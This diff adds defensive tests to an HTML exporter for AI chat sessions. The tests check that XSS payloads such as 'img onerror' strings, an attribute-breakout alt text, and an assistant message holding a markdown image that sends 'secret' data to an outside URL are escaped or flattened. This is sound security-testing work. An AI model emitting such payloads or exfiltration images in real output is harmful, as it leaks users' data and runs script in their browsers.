@@ -17,6 +17,7 @@ type SessionEntry = {
   customType?: string;
   provider?: string;
   modelId?: string;
+  thinkingLevel?: string;
 };
 
 type SessionData = {
@@ -161,6 +162,13 @@ describe("export html security hardening", () => {
         id: "5",
         parentId: "4",
         timestamp: now(),
+        type: "thinking_level_change",
+        thinkingLevel: attack,
+      },
+      {
+        id: "6",
+        parentId: "5",
+        timestamp: now(),
         type: attack,
       },
     ];
@@ -168,7 +176,7 @@ describe("export html security hardening", () => {
     const headerSession: SessionData = {
       header: { id: "session-2", timestamp: now() },
       entries: baseEntries,
-      leafId: "5",
+      leafId: "6",
       systemPrompt: "",
       tools: [],
     };
@@ -196,6 +204,18 @@ describe("export html security hardening", () => {
       "&lt;img src=x onerror=alert(9)&gt;",
     );
 
+    const thinkingLeafSession: SessionData = {
+      header: { id: "session-2-thinking", timestamp: now() },
+      entries: baseEntries,
+      leafId: "5",
+      systemPrompt: "",
+      tools: [],
+    };
+    const thinkingLeaf = renderTemplate(thinkingLeafSession).document;
+    expect(thinkingLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
+    expect(thinkingLeaf.getElementById("tree-container")?.innerHTML).toContain(
+      "&lt;img src=x onerror=alert(9)&gt;",
+    );
   });
 
   it("sanitizes image MIME types used in data URLs", () => {
@@ -229,5 +249,73 @@ describe("export html security hardening", () => {
     expect(img).toBeTruthy();
     expect(img?.getAttribute("onerror")).toBeNull();
     expect(img?.getAttribute("src")).toBe("data:application/octet-stream;base64,AAAA");
+  });
+
+  it("flattens remote markdown images but keeps data-image markdown", () => {
+    const dataImage = "data:image/png;base64,AAAA";
+    const session: SessionData = {
+      header: { id: "session-4", timestamp: now() },
+      entries: [
+        {
+          id: "1",
+          parentId: null,
+          timestamp: now(),
+          type: "message",
+          message: {
+            role: "assistant",
+            content: [
+              {
+                type: "text",
+                text: `Leak:\n\n![exfil](https://example.com/collect?data=secret)\n\n![pixel](${dataImage})`,
+              },
+            ],
+          },
+        },
+      ],
+      leafId: "1",
+      systemPrompt: "",
+      tools: [],
+    };
+
+    const { document } = renderTemplate(session);
+    const messages = document.getElementById("messages");
+    expect(messages).toBeTruthy();
+    expect(messages?.querySelector('img[src^="https://"]')).toBeNull();
+    expect(messages?.textContent).toContain("exfil");
+    expect(messages?.querySelector(`img[src="${dataImage}"]`)).toBeTruthy();
+  });
+
+  it("escapes markdown data-image attributes", () => {
+    const dataImage = "data:image/png;base64,AAAA";
+    const session: SessionData = {
+      header: { id: "session-5", timestamp: now() },
+      entries: [
+        {
+          id: "1",
+          parentId: null,
+          timestamp: now(),
+          type: "message",
+          message: {
+            role: "assistant",
+            content: [
+              {
+                type: "text",
+                text: `![x" onerror="alert(1)](${dataImage})`,
+              },
+            ],
+          },
+        },
+      ],
+      leafId: "1",
+      systemPrompt: "",
+      tools: [],
+    };
+
+    const { document } = renderTemplate(session);
+    const img = document.querySelector("#messages img");
+    expect(img).toBeTruthy();
+    expect(img?.getAttribute("onerror")).toBeNull();
+    expect(img?.getAttribute("alt")).toBe('x" onerror="alert(1)');
+    expect(img?.getAttribute("src")).toBe(dataImage);
   });
 });
